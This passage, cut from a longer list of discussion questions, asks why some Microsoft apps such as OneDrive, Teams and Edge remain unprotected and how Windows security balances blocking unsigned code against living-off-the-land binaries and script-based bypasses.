   - But OneDrive, Teams, Edge still vulnerable (2025 attacks documented)
   - Why not extend protection to all Microsoft apps?
   - Performance cost? Compatibility issues? Oversight?

9. **The fundamental tension: Security vs Functionality**
   - Blocking all unsigned code breaks development workflows
   - Trusting Microsoft-signed binaries enables LOLBAS
   - Allowing script execution enables CLM bypasses
   - Where should the line be drawn?
   - Is there a way to have both security and usability?

